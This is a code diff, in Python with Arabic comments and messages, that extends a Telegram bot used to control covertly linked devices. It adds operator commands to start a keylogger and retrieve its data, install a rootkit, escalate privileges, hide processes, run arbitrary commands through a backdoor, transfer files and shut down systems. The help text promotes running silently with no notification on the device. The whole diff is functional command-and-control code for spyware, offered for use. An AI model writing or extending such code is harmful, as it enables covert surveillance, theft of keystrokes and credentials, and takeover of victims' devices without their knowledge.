@@ -782,15 +782,38 @@ def send_help(message):
 • اختر الجهاز من القائمة
 • استخدم الأوامر المتاحة
 
+🛠️ **أوامر الخوارزميات المتطورة:**
+• `/keylogger start` - بدء تسجيل المفاتيح
+• `/keylogger stop` - إيقاف تسجيل المفاتيح
+• `/keylogger data` - الحصول على البيانات المسجلة
+
+🔧 **أوامر Rootkit:**
+• `/rootkit install` - تثبيت Rootkit
+• `/rootkit escalate` - تصعيد الصلاحيات
+• `/rootkit hide` - إخفاء العمليات
+
+🚪 **أوامر Backdoor:**
+• `/backdoor create` - إنشاء Backdoor
+• `/backdoor execute <command>` - تنفيذ أمر عن بعد
+• `/backdoor transfer` - نقل الملفات
+
+💻 **أوامر النظام:**
+• `/system info` - معلومات النظام
+• `/system control <action>` - التحكم في النظام
+• `/system monitor` - مراقبة النظام
+
 🛡️ **الأمان:**
 • جميع الاتصالات مشفرة
 • لا توجد إشعارات على الجهاز
 • يعمل في الخلفية تلقائياً
+• خوارزميات متطورة للحماية
+• برمجيات متقدمة للتحكم
 
 ⚠️ **ملاحظات مهمة:**
 • تأكد من وجود الإنترنت على الجهاز
 • قد تحتاج لتفعيل خيارات المطور
 • بعض الأوامر تحتاج صلاحيات خاصة
+• الأوامر الجديدة تتطلب تفعيل الخوارزميات أولاً
 """
 
     bot.reply_to(message, help_text, parse_mode='Markdown')
@@ -1406,6 +1429,377 @@ def cancel_reset(message):
         device_manager.log_activity(user_id, 'factory_reset_cancelled')
     else:
         bot.reply_to(message, "❌ لا توجد أوامر في قائمة الانتظار.")
+
+
+@bot.message_handler(commands=['keylogger'])
+def control_keylogger(message):
+    """التحكم في خوارزمية تسجيل المفاتيح"""
+    user_id = message.from_user.id
+
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+
+    if not device_manager.is_user_authorized(user_id):
+        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
+        return
+
+    if not security_manager.check_rate_limit(user_id):
+        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
+        return
+
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
+    devices = device_manager.get_user_devices(user_id)
+    active_devices = [d for d in devices if d[1] == 'active']
+    pending_devices = [d for d in devices if d[1] == 'pending']
+
+    if not active_devices and not pending_devices:
+        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
+        return
+
+    # استخدام جهاز نشط أو تفعيل جهاز معلق
+    if active_devices:
+        device_id = active_devices[0][0]
+        status = "نشط"
+    else:
+        device_id = pending_devices[0][0]
+        # تفعيل الجهاز المعلق
+        if force_device_activation(device_id):
+            status = "تم تفعيله"
+        else:
+            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+            return
+
+    # تحليل الأمر
+    command_parts = message.text.split()
+    if len(command_parts) < 2:
+        bot.reply_to(message, "📋 أوامر خوارزمية تسجيل المفاتيح:\n\n"
+                             "`/keylogger start` - بدء تسجيل المفاتيح\n"
+                             "`/keylogger stop` - إيقاف تسجيل المفاتيح\n"
+                             "`/keylogger data` - الحصول على البيانات المسجلة")
+        return
+
+    action = command_parts[1].lower()
+    
+    if action == 'start':
+        command_id = device_manager.save_command(user_id, device_id, 'keylogger_start')
+        result = command_executor.send_command(device_id, 'keylogger_start')
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, "⌨️ تم بدء خوارزمية تسجيل المفاتيح")
+            device_manager.update_command_result(command_id, 'sent')
+            
+    elif action == 'stop':
+        command_id = device_manager.save_command(user_id, device_id, 'keylogger_stop')
+        result = command_executor.send_command(device_id, 'keylogger_stop')
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, "⏹️ تم إيقاف خوارزمية تسجيل المفاتيح")
+            device_manager.update_command_result(command_id, 'sent')
+            
+    elif action == 'data':
+        command_id = device_manager.save_command(user_id, device_id, 'keylogger_get_data')
+        result = command_executor.send_command(device_id, 'keylogger_get_data')
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, "📊 جاري الحصول على البيانات المسجلة...")
+            device_manager.update_command_result(command_id, 'sent')
+    else:
+        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/keylogger` للمساعدة.")
+
+    device_manager.log_activity(user_id, 'keylogger_control', f'device_id: {device_id}, action: {action}')
+
+
+@bot.message_handler(commands=['rootkit'])
+def control_rootkit(message):
+    """التحكم في Rootkit"""
+    user_id = message.from_user.id
+
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+
+    if not device_manager.is_user_authorized(user_id):
+        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
+        return
+
+    if not security_manager.check_rate_limit(user_id):
+        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
+        return
+
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
+    devices = device_manager.get_user_devices(user_id)
+    active_devices = [d for d in devices if d[1] == 'active']
+    pending_devices = [d for d in devices if d[1] == 'pending']
+
+    if not active_devices and not pending_devices:
+        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
+        return
+
+    # استخدام جهاز نشط أو تفعيل جهاز معلق
+    if active_devices:
+        device_id = active_devices[0][0]
+        status = "نشط"
+    else:
+        device_id = pending_devices[0][0]
+        # تفعيل الجهاز المعلق
+        if force_device_activation(device_id):
+            status = "تم تفعيله"
+        else:
+            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+            return
+
+    # تحليل الأمر
+    command_parts = message.text.split()
+    if len(command_parts) < 2:
+        bot.reply_to(message, "📋 أوامر Rootkit:\n\n"
+                             "`/rootkit install` - تثبيت Rootkit\n"
+                             "`/rootkit escalate` - تصعيد الصلاحيات\n"
+                             "`/rootkit hide` - إخفاء العمليات")
+        return
+
+    action = command_parts[1].lower()
+    
+    if action == 'install':
+        command_id = device_manager.save_command(user_id, device_id, 'rootkit_install')
+        result = command_executor.send_command(device_id, 'rootkit_install')
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, "🔧 تم تثبيت Rootkit بنجاح")
+            device_manager.update_command_result(command_id, 'sent')
+            
+    elif action == 'escalate':
+        command_id = device_manager.save_command(user_id, device_id, 'rootkit_escalate')
+        result = command_executor.send_command(device_id, 'rootkit_escalate')
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, "🔑 تم تصعيد الصلاحيات بنجاح")
+            device_manager.update_command_result(command_id, 'sent')
+            
+    elif action == 'hide':
+        command_id = device_manager.save_command(user_id, device_id, 'rootkit_hide')
+        result = command_executor.send_command(device_id, 'rootkit_hide')
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, "👻 تم إخفاء العمليات بنجاح")
+            device_manager.update_command_result(command_id, 'sent')
+    else:
+        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/rootkit` للمساعدة.")
+
+    device_manager.log_activity(user_id, 'rootkit_control', f'device_id: {device_id}, action: {action}')
+
+
+@bot.message_handler(commands=['backdoor'])
+def control_backdoor(message):
+    """التحكم في Backdoor"""
+    user_id = message.from_user.id
+
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+
+    if not device_manager.is_user_authorized(user_id):
+        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
+        return
+
+    if not security_manager.check_rate_limit(user_id):
+        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
+        return
+
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
+    devices = device_manager.get_user_devices(user_id)
+    active_devices = [d for d in devices if d[1] == 'active']
+    pending_devices = [d for d in devices if d[1] == 'pending']
+
+    if not active_devices and not pending_devices:
+        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
+        return
+
+    # استخدام جهاز نشط أو تفعيل جهاز معلق
+    if active_devices:
+        device_id = active_devices[0][0]
+        status = "نشط"
+    else:
+        device_id = pending_devices[0][0]
+        # تفعيل الجهاز المعلق
+        if force_device_activation(device_id):
+            status = "تم تفعيله"
+        else:
+            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+            return
+
+    # تحليل الأمر
+    command_parts = message.text.split()
+    if len(command_parts) < 2:
+        bot.reply_to(message, "📋 أوامر Backdoor:\n\n"
+                             "`/backdoor create` - إنشاء Backdoor\n"
+                             "`/backdoor execute <command>` - تنفيذ أمر عن بعد\n"
+                             "`/backdoor transfer` - نقل الملفات")
+        return
+
+    action = command_parts[1].lower()
+    
+    if action == 'create':
+        command_id = device_manager.save_command(user_id, device_id, 'backdoor_create')
+        result = command_executor.send_command(device_id, 'backdoor_create')
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, "🚪 تم إنشاء Backdoor بنجاح")
+            device_manager.update_command_result(command_id, 'sent')
+            
+    elif action == 'execute':
+        if len(command_parts) < 3:
+            bot.reply_to(message, "❌ يرجى تحديد الأمر المراد تنفيذه.\nمثال: `/backdoor execute whoami`")
+            return
+            
+        command_to_execute = ' '.join(command_parts[2:])
+        command_id = device_manager.save_command(user_id, device_id, 'backdoor_execute', json.dumps({'command': command_to_execute}))
+        result = command_executor.send_command(device_id, 'backdoor_execute', {'command': command_to_execute})
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, f"⚡ تم إرسال الأمر: `{command_to_execute}`")
+            device_manager.update_command_result(command_id, 'sent')
+            
+    elif action == 'transfer':
+        command_id = device_manager.save_command(user_id, device_id, 'backdoor_transfer')
+        result = command_executor.send_command(device_id, 'backdoor_transfer')
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, "📁 تم بدء نقل الملفات")
+            device_manager.update_command_result(command_id, 'sent')
+    else:
+        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/backdoor` للمساعدة.")
+
+    device_manager.log_activity(user_id, 'backdoor_control', f'device_id: {device_id}, action: {action}')
+
+
+@bot.message_handler(commands=['system'])
+def control_system(message):
+    """التحكم في النظام"""
+    user_id = message.from_user.id
+
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+
+    if not device_manager.is_user_authorized(user_id):
+        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
+        return
+
+    if not security_manager.check_rate_limit(user_id):
+        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
+        return
+
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
+    devices = device_manager.get_user_devices(user_id)
+    active_devices = [d for d in devices if d[1] == 'active']
+    pending_devices = [d for d in devices if d[1] == 'pending']
+
+    if not active_devices and not pending_devices:
+        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
+        return
+
+    # استخدام جهاز نشط أو تفعيل جهاز معلق
+    if active_devices:
+        device_id = active_devices[0][0]
+        status = "نشط"
+    else:
+        device_id = pending_devices[0][0]
+        # تفعيل الجهاز المعلق
+        if force_device_activation(device_id):
+            status = "تم تفعيله"
+        else:
+            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+            return
+
+    # تحليل الأمر
+    command_parts = message.text.split()
+    if len(command_parts) < 2:
+        bot.reply_to(message, "📋 أوامر النظام:\n\n"
+                             "`/system info` - معلومات النظام\n"
+                             "`/system control <action>` - التحكم في النظام\n"
+                             "`/system monitor` - مراقبة النظام")
+        return
+
+    action = command_parts[1].lower()
+    
+    if action == 'info':
+        command_id = device_manager.save_command(user_id, device_id, 'system_info')
+        result = command_executor.send_command(device_id, 'system_info')
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, "💻 جاري الحصول على معلومات النظام...")
+            device_manager.update_command_result(command_id, 'sent')
+            
+    elif action == 'control':
+        if len(command_parts) < 3:
+            bot.reply_to(message, "❌ يرجى تحديد الإجراء المراد تنفيذه.\nمثال: `/system control shutdown`")
+            return
+            
+        system_action = command_parts[2].lower()
+        command_id = device_manager.save_command(user_id, device_id, 'system_control', json.dumps({'action': system_action}))
+        result = command_executor.send_command(device_id, 'system_control', {'action': system_action})
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, f"🎮 تم إرسال إجراء النظام: `{system_action}`")
+            device_manager.update_command_result(command_id, 'sent')
+            
+    elif action == 'monitor':
+        command_id = device_manager.save_command(user_id, device_id, 'system_monitor')
+        result = command_executor.send_command(device_id, 'system_monitor')
+        
+        if 'error' in result:
+            bot.reply_to(message, f"❌ خطأ: {result['error']}")
+            device_manager.update_command_result(command_id, 'failed', result['error'])
+        else:
+            bot.reply_to(message, "📊 جاري بدء مراقبة النظام...")
+            device_manager.update_command_result(command_id, 'sent')
+    else:
+        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/system` للمساعدة.")
+
+    device_manager.log_activity(user_id, 'system_control', f'device_id: {device_id}, action: {action}')
+
 
 # معالجة الرسائل النصية
 @bot.message_handler(func=lambda message: True)
